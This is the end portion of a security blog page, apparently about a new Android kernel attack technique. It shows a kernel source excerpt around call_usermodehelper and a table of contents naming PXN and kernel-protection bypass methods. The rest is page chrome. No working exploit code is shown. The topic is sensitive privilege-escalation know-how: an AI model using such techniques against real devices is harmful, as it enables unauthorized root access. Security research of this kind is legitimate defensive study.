+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kobject_uevent_env</span><span class="params">(<span class="keyword">struct</span> kobject *kobj, <span class="keyword">enum</span> kobject_action action,</span><br><span class="line">		       <span class="keyword">char</span> *envp_ext[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="comment">// uevent_helper = CONFIG_UEVENT_HELPER_PATH = "/sbin/hotplug"</span></span><br><span class="line">	...</span><br><span class="line">	argv [<span class="number">0</span>] = uevent_helper;</span><br><span class="line">	argv [<span class="number">1</span>] = (<span class="keyword">char</span> *)subsystem;</span><br><span class="line">	argv [<span class="number">2</span>] = <span class="literal">NULL</span>;</span><br><span class="line">	...</span><br><span class="line">	retval = call_usermodehelper(argv[<span class="number">0</span>], argv,</span><br><span class="line">					     env-&gt;envp, UMH_WAIT_EXEC);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/root/" rel="tag">#root</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/05/12/android-syscall-define/" rel="prev">Android SYSCALL_DEFINE</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/11/09/exploit-kernel-security-flaws/" rel="next">KERNEL SECURITY FLAWS (0day for nexus4)</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div>
+      
+        <style type="text/css">
+
+    .donate_bar {
+        text-align: center;
+        margin-top : 5%;
+    }
+
+    .donate_bar.hidden {
+        display:none;
+    }
+/*
+    .donate_bar a.btn_donate {
+        display: inline-block;
+        width: 82px;
+        height: 82px;
+        margin-left:auto;
+        margin-right:auto;
+
+        background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat;
+        _background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat; 
+
+        -webkit-transition: background 0s;
+        -moz-transition: background 0s;
+        -o-transition: background 0s;
+        -ms-transition: background 0s;
+        transition: background 0s;
+    }
+*/
+    .donate_bar a.btn_donate:hover { 
+        // background-position: 0px -82px;
+        color: #87daff
+    }
+
+    .donate_bar .donate_txt {
+        display: block;
+        color: #9d9d9d;
+        font: 14px/2 "Microsoft Yahei";
+    }
+
+    .bold { 
+        font-weight: bold; 
+    }
+
+    .post-donate a {
+        border-bottom: 0px;
+    }
+
+    #donate_guide table {
+        border: none;
+    }
+
+    #donate_guide td {
+        border-bottom: none;
+        border-right: none;
+        background: #333333;
+        valign: top;
+    }
+
+</style>
+
+
+
+    
+
+    <div class ="post-donate">
+        <div id="donate_board" class="donate_bar center">
+              <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏">赏</a>
+              <span id="donate_txt" class="donate_txt">
+                   
+                        仅仅是一个功能
+                   
+              </span>
+            <br>
+        </div>  
+  
+        <div id="donate_guide" class="donate_bar center hidden">
+            <!--
+            
+                <a href="http://o7keinrz4.bkt.clouddn.com/alipay.jpg" title="支付宝打赏" class="fancybox" rel="article0" 
+                    style="float:left;margin-left:25%;margin-right:10px;">
+                    <img src="http://o7keinrz4.bkt.clouddn.com/alipay.jpg" title="" height="164px" width="164px">
+                </a> 
+              
+
+            
+                <a href="http://o7keinrz4.bkt.clouddn.com/wechat.jpg" title="微信打赏" class="fancybox" rel="article0"
+                    style="margin-right:30%">
+                    <img src="http://o7keinrz4.bkt.clouddn.com/wechat.jpg" title="" height="164px" width="164px">
+                </a>
+            
+            -->
+            <table>
+                <tr>
+                    <td>
+                        
+                            <a href="http://o7keinrz4.bkt.clouddn.com/alipay.jpg" title="支付宝打赏" class="fancybox" rel="article0" 
+                                style="float:left;margin-left:25%;margin-right:10px;">
+                                <img src="http://o7keinrz4.bkt.clouddn.com/alipay.jpg" title="" height="164px" width="164px">
+                            </a> 
+                         
+                    </td>
+                    <td>
+                        
+                            <a href="http://o7keinrz4.bkt.clouddn.com/wechat.jpg" title="微信打赏" class="fancybox" rel="article0"
+                                style="margin-right:30%">
+                                <img src="http://o7keinrz4.bkt.clouddn.com/wechat.jpg" title="" height="164px" width="164px">
+                            </a>
+                        
+                    </td>
+                </tr>
+            </table>
+
+        </div>
+
+        <script type="text/javascript">
+            document.getElementById('btn_donate').onclick = function() {
+                $('#donate_board').addClass('hidden');
+                // $('#donate_guide').removeClass('hidden');
+                $('#donate_guide').show(2000);
+            }
+
+        </script>
+    </div>
+
+    
+
+
+      
+    </div>
+
+    <div class="post-spread">
+      
+        <div class="bdsharebuttonbox">
+	<a href="#" class="bds_more" data-cmd="more"></a>
+	<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+	<a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
+	<a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+          <div class="comments" id="comments">
+            
+              <div id="disqus_thread">
+                <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+              </div>
+            
+          </div>
+        
+      </div>
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table Of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/default_avatar.jpg" alt="idhyt" itemprop="image"/>
+          <p class="site-author-name" itemprop="name">idhyt</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">水中月.镜中花.浮华一片苍凉..</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">39</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            <a href="/categories">
+              <span class="site-state-item-count">6</span>
+              <span class="site-state-item-name">categories</span>
+              </a>
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">23</span>
+              <span class="site-state-item-name">tags</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="menu-item-icon icon-next-feed"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://github.com/idhyt" target="_blank">GitHub</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/idhyt3r" target="_blank">Twitter</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/idhyt" target="_blank">Weibo</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.zhihu.com/people/idhyt" target="_blank">ZhiHu</a>
+              </span>
+            
+          
+        </div>
+
+        <div class="links-of-friendly motion-element">
+          
+            <p class="site-author-name">Links</p>
+            
+              <span class="links-of-author-item">
+              <a href="http://blog.idhyt.com/about/" target="_blank">About</a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Proposing_new_kernel_attack_technique"><span class="nav-number">1.</span> <span class="nav-text">Proposing new kernel attack technique</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PXN_bypass_attack_without_ROP"><span class="nav-number">1.1.</span> <span class="nav-text">PXN bypass attack without ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#When_only_partial_memory_value_can_be_increased/decresed"><span class="nav-number">1.1.1.</span> <span class="nav-text">When only partial memory value can be increased/decresed</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#When_we_have_total_control_over_memory"><span class="nav-number">1.1.2.</span> <span class="nav-text">When we have total control over memory</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#kernel_thread_command_execution"><span class="nav-number">1.2.</span> <span class="nav-text">kernel thread command execution</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Bypassing_PXN_by_calling_call_usermodehelper"><span class="nav-number">1.2.1.</span> <span class="nav-text">Bypassing PXN by calling call_usermodehelper</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kernel_Protection_bypass"><span class="nav-number">1.2.2.</span> <span class="nav-text">Kernel Protection bypass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#the_easiest_kernel_protection_bypass"><span class="nav-number">1.2.3.</span> <span class="nav-text">the easiest kernel protection bypass</span></a></li></ol></li></ol></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright" >
+  
+  &copy; &nbsp;  2011 - 
+  <span itemprop="copyrightYear">2018
+  </span>
+  <span class="with-love">
+    <i class="icon-next-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">idhyt
+  </span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme by <a class="theme-link" href="http://blog.idhyt.com">idhyt</a>.<a class="theme-link" href="https://github.com/idhyt/hexo-theme-next/tree/magiclamp">Mala</a>
+</div>
+
+<!-- busuanzi -->
+
+
+
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+  
+    <script type="text/javascript">
+      var disqus_shortname = 'idhyt';
+      var disqus_identifier = '2016/11/17/android-proposing-new-kernel-attack-technique/';
+      var disqus_title = 'Proposing new kernel attack technique';
+      var disqus_url = 'http://blog.idhyt.com/2016/11/17/android-proposing-new-kernel-attack-technique/';
+
+      function run_disqus_script(disqus_script){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      }
+
+      var disqus_forbid = true;
+      function google_forbid() {
+        disqus_forbid = true;
+      }
+
+      function google_allow() {
+        disqus_forbid = false;
+      }
+
+    </script>
+
+    
+
+      <style type="text/css">
+        .show-commit-btn {
+            text-align: center;
+            margin-top: 5%;
+            display: inline-block;
+            color: #ddd;
+            font: 14px/2 "Microsoft Yahei";
+            background: #444;
+            padding: 1px 5px;
+            border-bottom: none;
+            // background:url("data:image/svg+xml;base64,PD94bWwgdm3Mz4=") no-repeat 0 50%
+            // background:url("http//xxxx.gif") no-repeat 0 
+        }
+        .show-commit-cls a:hover { 
+            // background-position: 0px -82px;
+            color: #87daff;
+            background: none;
+        }
+
+        .show-commit-dsp {
+            text-align: center;
+            font: 14px/2 "Microsoft Yahei";
+            color: #ddd;
+            margin-top: 5%;
+        }
+      </style>
+
+
+      <script type="text/javascript">
+
+        // var disqus_loaded = false;
+
+        var disqus_false_text = "Disqus评论可能被墙";
+
+        
+        
+        var show_btn = 
+          '<div class="show-commit-cls">  \
+            <a id="show_commit_btn" class="show-commit-btn" href="javascript:;" title="评论">评论/查看评论</a>  \
+            <div id="show_commit_dsp" class="show-commit-dsp"> ' + disqus_false_text + 
+            '</div> </div>';
+        var t_comments = document.getElementById("comments");
+        t_comments.insertAdjacentHTML("beforeBegin", show_btn);
+
+        $('.show-commit-dsp').hide();
+
+        <!--
+        // define duoshuoQuery
+        var duoshuo_shortname = '';
+        var duoshuoQuery = {short_name: duoshuo_shortname};
+        -->
+
+        document.getElementById('show_commit_btn').onclick = function() {
+          // if (!disqus_loaded) 
+          {
+            // disqus_loaded = true;
+            $('.show-commit-btn').hide();
+
+            // if google forbid, not load disqus.
+            if (!disqus_forbid) {
+              run_disqus_script('count.js');
+              
+                run_disqus_script('embed.js');
+              
+            }
+            <!--
+            // else load duoshuo.
+            else if (disqus_forbid) {
+              if ($('.show-commit-dsp').css("display") == "none") {
+                $('.show-commit-dsp').show(1500);
+              }
+              
+              // if google forbid then load duoshuo
+              if (duoshuo_shortname) {
+                (function() {
+                  var ds = document.createElement('script');
+                  ds.type = 'text/javascript';
+                  ds.async = true;
+                  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+                  ds.charset = 'UTF-8';
+                  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(ds);
+                })();
+              }
+              var duoshuo_comment = 
+                '<div class="ds-thread" \
+                    data-thread-key="2016/11/17/android-proposing-new-kernel-attack-technique/" \
+                    data-title="Proposing new kernel attack technique" data-url="http://blog.idhyt.com/2016/11/17/android-proposing-new-kernel-attack-technique/">  \
+                </div>';
+              t_comments.insertAdjacentHTML("afterBegin", duoshuo_comment);
+            }
+            -->
+          }
+        }
+
+      </script>
+      <img src="http://disqus.com/api/users/avatars/disqus_api.jpg" style="display: none" onload="google_allow()" onerror="google_forbid()"/>
+
+    
+
+  
+
+
+
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+        displaySidebar();
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+</body>
+</html>
